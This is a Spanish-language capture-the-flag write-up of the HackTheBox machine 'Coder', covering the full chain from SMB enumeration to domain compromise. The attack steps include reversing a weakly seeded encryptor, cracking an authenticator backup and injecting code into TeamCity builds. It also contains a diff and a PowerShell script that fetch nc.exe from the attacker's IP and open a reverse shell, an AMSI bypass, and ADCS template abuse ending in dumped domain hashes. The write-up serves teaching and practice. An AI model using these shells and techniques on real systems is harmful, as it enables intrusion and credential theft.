---
aliases:
tags:
title: Coder - Insane (HTB)
toc: true
permalink: /Coder-HTB-Writeup
toc_sticky: true
toc_label: Topics
sidebar: main
---
---
# Recon

```bash
 nmap -sCV -p53,80,88,135,139,443,445,593,49664,49674,49679,53813 10.129.229.190
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 11:02 -0500
Nmap scan report for 10.129.229.190
Host is up (1.1s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-16 00:04:59Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open   ssl/https?
|_ssl-date: 2026-02-16T00:07:50+00:00; +8h01m36s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Not valid before: 2022-11-04T17:25:43
|_Not valid after:  2032-11-01T17:25:43
445/tcp   open   microsoft-ds?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49664/tcp open   msrpc         Microsoft Windows RPC
49674/tcp closed unknown
49679/tcp closed unknown
53813/tcp closed unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h01m37s, deviation: 3s, median: 8h01m35s
| smb2-time:
|   date: 2026-02-16T00:07:03
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.66 seconds
```

```bash
addhost 10.129.229.190 DC01
[+] Appended DC01 to existing entry for 10.129.229.190 in /etc/hosts
10.129.229.190 coder.htb DC01.coder.htb DC01
```

### SMB null session

Como la sesion anonima esta habilitada, me conecte por `smbclient`.

```bash
nxc smb coder.htb -u guest -p ''
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [+] coder.htb\guest:
```

```bash
impacket-smbclient coder.htb/guest@dc01.coder.htb -no-pass -dc-ip 10.129.229.190
```

### Windows executable file

Dentro del recurso `Development`, en la carpeta `Temporary Projects`, encontré un ejecutable de Windows juntos con un archivo encriptado `(.enc)`.

```bash
<SNIP>
# cd Temporary ProjectS
ls
# ls
drw-rw-rw-          0  Fri Nov 11 17:19:03 2022 .
drw-rw-rw-          0  Fri Nov 11 17:19:03 2022 ..
-rw-rw-rw-       5632  Fri Nov  4 12:58:20 2022 Encrypter.exe
-rw-rw-rw-       3808  Fri Nov 11 17:17:08 2022 s.blade.enc
# mget *
```

Traslade ambos a una VM Windows para analizarlo.

### Reverse engineering

La función principal de binario espera un argumento.

```C#
 public static void Main(string[] args)
  {
    if (args.Length != 1)
    {
      Console.WriteLine("You must provide the name of a file to encrypt.");
    }
    else
    {
      FileInfo fileInfo = new FileInfo(args[0]);
      string destFile = Path.ChangeExtension(fileInfo.Name, ".enc");
      Random random = new Random(Convert.ToInt32(DateTimeOffset.Now.ToUnixTimeSeconds()));
      byte[] numArray1 = new byte[16];
      random.NextBytes(numArray1);
      byte[] numArray2 = new byte[32];
      random.NextBytes(numArray2);
      AES.EncryptFile(fileInfo.Name, destFile, numArray2, numArray1);
    }
  }
```

El mismo genera un `IV` y `Key` random y llama a la función `EncryptFile`. Con `rijndaelManaged` que es la clase de .NET que procesa con `AES` un archivo y lo encripta, dejando un archivo `.enc`.

```C#
  private static byte[] EncryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
  {
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
      using (FileStream fileStream1 = new FileStream(destFile, FileMode.Create))
      {
        using (ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor(Key, IV))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, encryptor, CryptoStreamMode.Write))
          {
            using (FileStream fileStream2 = new FileStream(sourceFile, FileMode.Open))
            {
              byte[] buffer = new byte[1024];
              int count;
              while ((count = fileStream2.Read(buffer, 0, buffer.Length)) != 0)
                cryptoStream.Write(buffer, 0, count);
            }
          }
        }
      }
    }
    return (byte[]) null;
  }
}
```

### Encryption timestamp

El `iv` y `key` se crean de manera aleatoria con el tiempo actual, por lo que puedo obtener el valor original de la semilla `(seed)` en el archivo original que encontré en `SMB` usando su fecha.

```bash
date -d "2022-11-11 17:17:08" +%s
1668205028
```

### Decrypt file

Para realizar el proceso inverso para desencriptar el archivo `s.blade.enc` cambien algunas de las funciones y quedo asi:

```C#
using System;
using System.IO;
using System.Security.Cryptography;

internal class AES
{
    public static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: Decrypter.exe <sourceFile> <destFile>");
            return;
        }
        string sourceFile = args[0];
        string destFile = args[1];

        int value = 1668205028;
        Console.WriteLine("Seed: " + value);

        Random random = new Random(Convert.ToInt32(value));

        byte[] IV  = new byte[16];
        random.NextBytes(IV);

        byte[] Key = new byte[32];
        random.NextBytes(Key);

        Console.WriteLine("IV:  " + BitConverter.ToString(IV));
        Console.WriteLine("Key: " + BitConverter.ToString(Key));

        DecryptFile(sourceFile, destFile, Key, IV);
        Console.WriteLine("Done! Output: " + destFile);
    }

    private static void DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
    {
        using (RijndaelManaged rm = new RijndaelManaged())
        using (FileStream fsIn   = new FileStream(sourceFile, FileMode.Open))
        using (FileStream fsOut  = new FileStream(destFile, FileMode.Create))
        using (ICryptoTransform dec = rm.CreateDecryptor(Key, IV))
        using (CryptoStream cs   = new CryptoStream(fsIn, dec, CryptoStreamMode.Read))
        {
            byte[] buffer = new byte[1024];
            int count;
            while ((count = cs.Read(buffer, 0, buffer.Length)) != 0)
                fsOut.Write(buffer, 0, count);
        }
    }
}
```

En mi caso hardcodee el `seed` para que use el mismo para la creación de las dos claves, donde las mismas luego las uso para abrir el archivo de entrada (`s.blade.enc`), desencriptarlo con estas, y colocar el output en un nuevo archivo
## Shell as svc_teamcity
### Execute

Luego de ejecutarlo veo el valor de ambos y me deja el archivo desencriptado.

```powershell
PS C:\temp> .\Encrypter.exe .\s.blade.enc s.blade
Seed: 1668205028
IV:  3E-65-D2-65-E6-22-44-DF-1F-30-8C-68-36-AD-21-5B
Key: 0E-67-4F-D7-2B-A9-46-B2-90-BE-0A-5E-88-67-24-02-58-71-29-B7-80-DB-13-48-08-C1-ED-CE-0B-FE-B4-8C
Done! Output: s.blade
```

El mismo me lo pase a mi maquina Linux para analizarlo, viendo que por los primeros bytes del archivo parece ser un comprimido `7z`.

```bash
file s.blade
s.blade: 7-zip archive data, version 0.4
```
### KeePass database

Lo renombre y lo descomprimí, viendo que el mismo contiene un archivo de base de datos de `KeePass` junto con la key que lo abre.

```bash
7z x ss.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM
<snip>

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-11-03 15:02:30 ..H.A         1024         1028  .key
2022-11-11 17:13:55 ....A         2590         2594  s.blade.kdbx
------------------- ----- ------------ ------------  ------------------------
2022-11-11 17:13:55               3614         3622  2 files
```

Lo abri.

![image-center](/assets/images/Pasted image 20260215234433.png)

Y encontré `3` passwords almacenadas.

![image-center](/assets/images/Pasted image 20260217160908.png)
### New subdomain

Una contiene un nuevo subdominio.

![image-center](/assets/images/Pasted image 20260216001105.png)

Y otro contiene un archivo de backup de `Authenticator`.

![image-center](/assets/images/Pasted image 20260216001125.png)

### TeamCity website

Yendo a la pagina, veo que corre con `TeamCity`, por lo que intente conectarme con las credenciales del usuario `s.blade` que encontré en la base de datos.

![image-center](/assets/images/Pasted image 20260216001041.png)
### 2FA Authentication

Sin embargo falle, porque la sesión esta protegida por `Autenticacion con Doble Factor (2FA)`.

![image-center](/assets/images/Pasted image 20260216002604.png)

Para obtener el código instale la extensión de `Authenticator` en Firefox. Sin embargo mucho no pude hacer, así que me fui al repositorio de esta herramienta para analizar la forma en la que encripta y desencripta los backups.
### Source code

Donde se puede ver que recibe una lista de cuentas (`backupData`) y una contraseña (`passphrase`). Devuelve una nueva lista donde los secretos (las semillas TOTP) ya no están cifrados.

Para el proceso de desencriptado toma el `secret` y usa la librería `CryptoJS.AES` con el `passphrase`.

```javascript
export function decryptBackupData(
  backupData: { [hash: string]: OTPStorage },
  passphrase: string | null
) {
  const decryptedbackupData: { [hash: string]: OTPStorage } = {};
  for (const hash of Object.keys(backupData)) {
    if (typeof backupData[hash] !== "object") {
      continue;
    }
    if (!backupData[hash].secret) {
      continue;
    }
    if (backupData[hash].encrypted && !passphrase) {
      continue;
    }
    if (backupData[hash].encrypted && passphrase) {
      try {
        backupData[hash].secret = CryptoJS.AES.decrypt(
          backupData[hash].secret,
          passphrase
        ).toString(CryptoJS.enc.Utf8);
        backupData[hash].encrypted = false;
      } catch (error) {
        continue;
      }
    }
    // backupData[hash].secret may be empty after decrypt with wrong
    // passphrase
    if (!backupData[hash].secret) {
      continue;
    }
    decryptedbackupData[hash] = backupData[hash];
  }
  return decryptedbackupData;
}
```

Después se puede ver en el archivo `/src/components/import/TextImport.vue` que valida que tanto la `key` como el `passphrase` existan, y luego usa la `passphrase` para abrir o descubrir el valor de la `key` y luego el valor de la `key` lo usa para finalmente desencriptar el valor de secret

```javascript
if (key && passphrase) {
          decryptedbackupData = await decryptBackupData(
            exportData,
            CryptoJS.AES.decrypt(key.enc, passphrase).toString()
          );
        } else {
          decryptedbackupData = await decryptBackupData(exportData, passphrase);
        }
```
### Script

Instale primero las librerias.

```bash
npm install crypto-js argon2
```

Y luego para encontrar el valor de la semilla (`seed`) use este script.

```javascript
const fs = require('fs');
const readline = require('readline');
const CryptoJS = require('crypto-js');

// Datos extraídos de tu backup
const ENC_KEY_BLOCK = "U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1";
const SECRET_BLOCK = "U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2";

const wordlist = process.argv[2];

if (!wordlist) {
    console.log("\x1b[33m%s\x1b[0m", "Uso: node gemini_crack.js <diccionario>");
    process.exit(1);
}

const rl = readline.createInterface({
    input: fs.createReadStream(wordlist),
    terminal: false
});

console.log(`[*] Iniciando crack sobre el backup de s.blade...`);

rl.on('line', (password) => {
    try {
        // PASO 1: Intentar derivar la Llave Maestra (Master Key) en formato HEX
        const masterKeyHex = CryptoJS.AES.decrypt(ENC_KEY_BLOCK, password).toString();

        if (masterKeyHex) {
            // PASO 2: Usar esa llave HEX para abrir el secreto final
            const decryptedBytes = CryptoJS.AES.decrypt(SECRET_BLOCK, masterKeyHex);
            const seed = decryptedBytes.toString(CryptoJS.enc.Utf8);

            // PASO 3: Validación de Semilla (A-Z, 2-7 son los caracteres de Base32)
            if (seed.length >= 16 && /^[A-Z2-7=]+$/i.test(seed)) {
                console.log("\n\x1b[32m[+] ¡LLAVE ENCONTRADA!\x1b[0m");
                console.log("------------------------------------------");
                console.log(`Password: ${password}`);
                console.log(`TOTP Seed: ${seed}`);
                console.log("------------------------------------------");
                
                rl.close();
                process.exit(0);
            }
        }
    } catch (e) {
        // Error silencioso: la contraseña no era correcta
    }
});

rl.on('close', () => {
    console.log("[*] Fin del diccionario.");
});
```

Luego simplemente importe el backup usando la passphrase `skyblade`.

![image-center](/assets/images/Pasted image 20260216004213.png)
### Generate code

Y ahora si puedo generar códigos para loguearme en la web.

![image-center](/assets/images/Pasted image 20260216004232.png)

Por algún motivo no me conectaba, y pude pensar por la sincronización de mi reloj con el DC, así que lo sincronice con `ntpdate`.

```bash
sudo timedatectl set-ntp false
sudo ntpdate coder.htb
2026-02-16 07:01:49.966705 (-0500) +28629.458661 +/- 0.172031 coder.htb 10.129.229.190 s1 no-leap
CLOCK: time stepped by 28629.458661
```
### Diff file 

Luego me pude conectar e iniciar sesion.

![image-center](/assets/images/Pasted image 20260216010609.png)

### Enumeration

Luego de enuemerar bastante la web, ya que no encontraba mucho, vi que podria crear como una especie de tarea, en la cual al ejecutarse la misma, se cargaba el contenido del archivo `hello_world.ps1`, el cual el mismo archivo se encontraba en el recurso `Development`, junto con todo el repositorio del mismo.
### Initialize a new repo

Vi el como el mismo contenía un mensaje, el sistema lo ejecutaba mostrando el output del comando 

```powershell
write-host "Hello, World!"
```

![image-center](/assets/images/Pasted image 20260216011226.png)
### nc.exe fail

Con dicho archivo en mi maquina, inicialize un nuevo repositorio.

```bash
git init
```

Luego agregue el archivo y comitee.

```bash
git add hello_world.ps1 
git commit -m "zsln"
```

Luego para crear un archivo `.diff`, edite el contenido del mismo, con una linea la cual descargue el `nc.exe` de mi maquina y me envie una shell.

```bash
write-host "Hello, World!"

iwr http://10.10.17.19/nc.exe -Outfile C:\programdata\nc.exe
C:\programdata\nc.exe 10.10.17.19 4444 -e cmd
```

Y cree el archivo con el siguiente comando.

```bash
git diff HEAD~1 HEAD > rev.diff
```

Haciendo que el contenido del mismo se vea asi.

```bash
diff --git a/hello_world.ps1 b/hello_world.ps1
index 09724d2..d2c6df5 100644
--- a/hello_world.ps1
+++ b/hello_world.ps1
@@ -1,2 +1,5 @@
 #Simple repo test for Teamcity pipeline
 write-host "Hello, World!"
+
+iwr http://10.10.17.19/nc.exe -Outfile C:\programdata\nc.exe
+C:\programdata\nc.exe 10.10.17.19 4444 -e cmd
```
### Upload file

Luego me dirigi a la web para subirlo clickeando en los 3 puntos y seleccionando la opcion `run as a personal build`, donde puedo seleccionar mi archivo `.diff`.

Sin embargo en el log del mismo veo que el Antivirus lo detecta como un virus.

![image-center](/assets/images/Pasted image 20260216014835.png)
### Shell

Así que volví a repetir el proceso, esta vez colocando directamente la `Reverse Shell`.

```powershell
❯ cat hello_world.ps1
#Simple repo test for Teamcity pipeline
write-host "Hello, World!"

$LHOST = "10.10.17.19"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Volví a subirlo, y luego de desplegarlo, desde mi listener `nc` recibí la conexión como el usuario `svc_teamcity`.

```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.190] 51180
whoami
coder\svc_teamcity
```
## Shell as e.black
### PSCredential password

En el directorio `C:\\ProgramData\JetBrains\TeamCity\system\changes`, hay varios archivos `diff` junto con los que subí 

```powershell
ls
101.changes.diff 201.changes.diff 204.changes.diff 205.changes 206.changes 207.changes.diff 208.changes.diff 209.changes.diff 210.changes.diff 211.changes.diff 212.changes.diff 213.changes.diff 214.changes.diff 215.changes.diff 216.changes.diff 217.changes.diff 218.changes.diff 219.changes.diff 220.changes.diff 221.changes.diff 222.changes.diff 223.changes.diff 224.changes.diff 225.changes.diff
```

Pero viendo el contenido del primero se ven almacenadas unas credenciales `PSCredential` encriptadas, y además la key que es la clave AES de 32 Bytes la cual se usa para desencriptar la cadena en `base64`

```powershell
gc .\101.changes.diff
diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1 index d6515ce..a990b2e 100644 --- a/Get-ADCS_Report.ps1 +++ b/Get-ADCS_Report.ps1 @@ -77,11 +77,15 @@ Function script:send_mail {      [string]      $subject    ) + +$key = Get-Content ".\key.key" +$pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key) +$cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)  $emailFrom = 'pkiadmins@coder.htb'  $emailCC = 'e.black@coder.htb'  $emailTo = 'itsupport@coder.htb'  $smtpServer = 'smtp.coder.htb' -Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High +Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High -Credential $cred  }     diff --git a/enc.txt b/enc.txt new file mode 100644 index 0000000..d352634 --- /dev/null +++ b/enc.txt @@ -0,0 +1,2 @@ +76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN +AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA== diff --git a/key.key b/key.key new file mode 100644 index 0000000..a6285ed --- /dev/null +++ b/key.key @@ -0,0 +1,32 @@ +144 +255 +52 +33 +65 +190 +44 +106 +131 +60 +175 +129 +127 +179 +69 +28 +241 +70 +183 +53 +153 +196 +10 +126 +108 +164 +172 +142 +119 +112 +20 +122
```
### Decrypt password

Para desencriptar la cadena,  use la clave AES y luego con `PSCredential` la convertí a texto plano.

```powershell
PS C:\WINDOWS\system32> # Definimos la llave y el texto cifrado
PS C:\WINDOWS\system32> $k = @(144,255,52,33,65,190,44,106,131,60,175,129,127,179,69,28,241,70,183,53,153,196,10,126,108,164,172,142,119,112,20,122)
PS C:\WINDOWS\system32> $e = "76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA=="
PS C:\WINDOWS\system32>
PS C:\WINDOWS\system32> # Desciframos y mostramos
PS C:\WINDOWS\system32> $pass = (New-Object System.Management.Automation.PSCredential 'user', ($e | ConvertTo-SecureString -Key $k)).GetNetworkCredential().Password
PS C:\WINDOWS\system32> Write-Host "`nLa contraseña es: $pass"

La contraseña es: ypOSJXPqlDOxxbQSfEERy300
```
### Auth

Esta password es valida para el usuario `e.black`.

```powershell
evil-winrm -i coder.htb -u e.black -p 'ypOSJXPqlDOxxbQSfEERy300'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\e.black\Documents> type ../desktop/user.txt
02117f252272e630407bbfac0463326a
```
## Shell as administrator
### Collect with bloodhound

Haciendo uso de estas credenciales recolecte la data del dominio con `bloodhound-python`.

```bash
bloodhound-python -c All -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -ns 10.129.229.190 -d coder.htb -dc coder.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: coder.htb
INFO: Getting TGT for user
<SNIP>
INFO: Done in 02M 17S
INFO: Compressing output into 20260216091911_bloodhound.zip
```
### Bypass amsi

Vi que el usuario `s.blade` es miembro de un grupo no común el cual es `BuildAgent mgmt`.

![image-center](/assets/images/Pasted image 20260216034450.png)

Antes que nada Bypassee el `amsi` con el propio modulo de `evil-winrm`
```powershell
*Evil-WinRM* PS C:\Users\e.black\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...

[+] Success!

Info: Patching ETW, please be patient ..

[+] Success!
```

### ACL Enumeration

Enumere las acls que la `OU` de este grupo tenia sobre el dominio.

```powershell
*Evil-WinRM* PS C:\ProgramData> (Get-Acl "AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb").access | where IdentityReference -eq "coder\BuildAgent Mgmt"


ActiveDirectoryRights : CreateChild, DeleteChild
InheritanceType       : All
ObjectType            : bf967a86-0de6-11d0-a285-00aa003049e2
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : ObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : CODER\BuildAgent Mgmt
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : Self, ReadProperty, WriteProperty
InheritanceType       : Descendents
ObjectType            : 72e39547-7b18-11d1-adef-00c04fd8d5cd
InheritedObjectType   : bf967a86-0de6-11d0-a285-00aa003049e2
ObjectFlags           : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType     : Allow
IdentityReference     : CODER\BuildAgent Mgmt
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : InheritOnly
```

De este output pude ver que `72e39547-7b18-11d1-adef-00c04fd8d5cd` representa a una computadora y que `bf967a86-0de6-11d0-a285-00aa003049e2` representa a `Validated-DNS-Host-Name`
### ADCS

Con esta información ya se que el usuario `s.blade` puede crear y eliminar computadoras en el `BuildAgents` OU, y ademas que e.black tiene la capacidad de manera las plantillas de los certificados por se miembro del grupo `PKI Admins`.
Combinando todo esto, puedo crear una plantilla vulnerable y subscribir una computador con el nombre DNS `dc01` por ejemplo para luego hacer uso de Certipy para obtener un hash.

Para eso use [ADCSTemplate.psm1](https://github.com/GoateePFE/ADCSTemplate) para clonar una plantilla existente con la cual voy a jugar.

```powershell
*Evil-WinRM* PS C:\Users\e.black\Documents> upload ADCSTemplate.psm1

Info: Uploading /home/zsln/Desktop/zsln/Coder/ADCSTemplate.psm1 to C:\Users\e.black\Documents\ADCSTemplate.psm1

Data: 29396 bytes of 29396 bytes copied

Info: Upload successful!
```

Para importar sus funciones use `ipmo`.

```powershell
ipmo .\ADCSTemplate.psm1
```

### Create template

Primero cree un `template` para luego exportarlo dentro de un archivo `json`.

```powershell
*Evil-WinRM* PS C:\Users\e.black\Documents> Export-ADCSTemplate -displayname Computer > out.json
```

Cargamos el objeto `JSON` en memoria para modificar el atributo `msPKI-Enrollment-Flag`, asignándole el valor `524288`. Tras realizar el ajuste, procedimos a serializar el objeto y sobrescribir el archivo `out.json` con los nuevos datos.

```powershell
*Evil-WinRM* PS C:\Users\e.black\Documents> $a = get-content out.json -raw | convertfrom-json
$a.'msPKI-Enrollment-Flag' = 524288
$a | convertto-json | set-content out.json
```

Y ya luego puedo crear un template personalizador usando el `json`.

```powershell
*Evil-WinRM* PS C:\Users\e.black\Documents> New-ADCSTemplate -DisplayName zslnn -JSON (Get-Content .\out.json -Raw) -Publish -Identity "CODER\PKI Admins"
```
### Create fake computer

Para crear una computadora falsa con el DNS name `dc01`, copie el script `addcomputer.py` y modifique su respectiva linea, quedando de la siguiente manera.

```bash
cat addcomputer.py | grep dns
                    'dnsHostName': '%s.%s' % ('dc01', self.__domain),
```

Cree la computadora

```powershell
python addcomputer.py 'coder.htb/s.blade:AmcwNO60Zg3vca3o0HDrTC6D' -computer-name "zslnn" -computer-pass "zs1nzs1n" -computer-group OU=BuildAgents,OU=DEVELOPMENT,DC=CODER,DC=HTB -method LDAPS
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account zslnn$ with password zs1nzs1n.
```

Y luego usando `Set-ADCSTemplateACL`, subscribi a dicha computadora al template que cree previamente.

```powershell
Set-ADCSTemplateACL -DisplayName zslnn -type allow -identity 'coder\zslnn$' -enroll
```
### Get certificate

De manera que ahora puedo usar las credenciales del mismo para obtener un certificador en nombre de la computadora `dc01.coder.htb`.

```bash
certipy-ad req -u zslnn\$@dc01.coder.htb -p 'zs1nzs1n' -ca CODER-DC01-CA -template zslnn -target dc01.coder.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.coder.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: DC01.CODER.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'dc01.coder.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```
### Get hash

Ahora use el mismo para autenticarme y así obtener un hash `NTLM`.

```bash
certipy-ad auth -pfx dc01.pfx -dc-ip 10.129.229.190
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'dc01.coder.htb'
[*] Using principal: 'dc01$@coder.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@coder.htb': aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94
```
### Dump

Y con el uso del mismo dumpee los hashes del dominio, entre ellos los del usuario `administrator`.

```bash
impacket-secretsdump coder.htb/'dc01$'@dc01.coder.htb -hashes :56dc040d21ac40b33206ce0c2f164f94
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26000ce1f6ca4029ec5d3a95631e797c:::
coder.htb\e.black:1106:aad3b435b51404eeaad3b435b51404ee:e1b96bbb66a073787a3310b5a956200d:::
coder.htb\c.cage:1107:aad3b435b51404eeaad3b435b51404ee:3ab6e9f70dbc0d19623be042d224b993:::
coder.htb\j.briggs:1108:aad3b435b51404eeaad3b435b51404ee:e38976c0b20e3e41e9c62da792115a33:::
coder.htb\l.kang:1109:aad3b435b51404eeaad3b435b51404ee:b8aba4878e4777864b292731ac88b4cd:::
coder.htb\s.blade:1110:aad3b435b51404eeaad3b435b51404ee:4e4a79beed7d042627d0a7b10f5d008a:::
coder.htb\svc_teamcity:5101:aad3b435b51404eeaad3b435b51404ee:4c5a6890e09834a6834dbf7a76bf20cb:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94:::
0xdf_PC$:21102:aad3b435b51404eeaad3b435b51404ee:a5c0bab5dbb71d3f8b7b42b599108fbb:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:86a6a038ff6058c56a74e2e35008f6b037b8e7bca8c75cc5ee4495f77d0be71e
Administrator:aes128-cts-hmac-sha1-96:6d63b0853502cbbc8c8e40ad8fe88fa3
Administrator:des-cbc-md5:37feabd9d9575785
krbtgt:aes256-cts-hmac-sha1-96:aeb517a1efec8b79479cb1432e734555bc1039bcbd77bcdc39234b37199a70d3
krbtgt:aes128-cts-hmac-sha1-96:2bab4af978e4cee0b58fa1d377d35981
krbtgt:des-cbc-md5:100489b5839798cb
coder.htb\e.black:aes256-cts-hmac-sha1-96:ccb6c47af9a05d91e7610fe396cd8ffcc0e51279a2eee253fab1fb40536a5a85
coder.htb\e.black:aes128-cts-hmac-sha1-96:650ad0d49ab4bcff325a7f2a846d433f
coder.htb\e.black:des-cbc-md5:89290da2c2cd16ec
coder.htb\c.cage:aes256-cts-hmac-sha1-96:ea9cc2144c3106e9325b1ddda16c27c644d9f9b7e95098581ceba19c75d9b296
coder.htb\c.cage:aes128-cts-hmac-sha1-96:2cff13848c9e8d07339a6ab41bf72088
coder.htb\c.cage:des-cbc-md5:fd6d578510df1af1
coder.htb\j.briggs:aes256-cts-hmac-sha1-96:ec3ac8b99094903a3ca006a725dc0867666347efb4baf04d8b2f8b0305ab65ee
coder.htb\j.briggs:aes128-cts-hmac-sha1-96:39050d78545c40645fa889c13200f8f7
